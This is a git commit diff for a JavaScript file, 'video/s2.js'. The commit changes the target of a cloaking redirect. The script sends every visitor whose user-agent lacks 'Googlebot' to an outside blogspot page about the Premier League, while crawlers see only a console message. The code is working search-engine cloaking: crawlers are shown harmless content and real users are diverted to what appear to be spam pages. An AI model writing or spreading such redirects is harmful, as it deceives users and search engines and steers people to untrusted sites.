31ea142d3a016b4b261bec68c388e69cfce5f2e2
bunsakiroba-cyber <bunsakiroba@gmail.com>
2026-08-22 17:30:00 +0600

    Update s2.js

--- video/s2.js
+++ video/s2.js
@@ -1,7 +1,7 @@
 // Check if the user-agent is not from a search engine crawler (e.g., Googlebot)
 if (!navigator.userAgent.includes('Googlebot')) {
   // Redirect only normal users
-  window.location.href = "https://hr.elastichq.org/fifa-world-cup/";
+  window.location.href = "https://armytndeee.blogspot.com/2026/08/premier-league.html";
 } else {
   // For search engine crawlers, you can choose to perform a different action or not redirect
   console.log("Thanks for visiting my page");
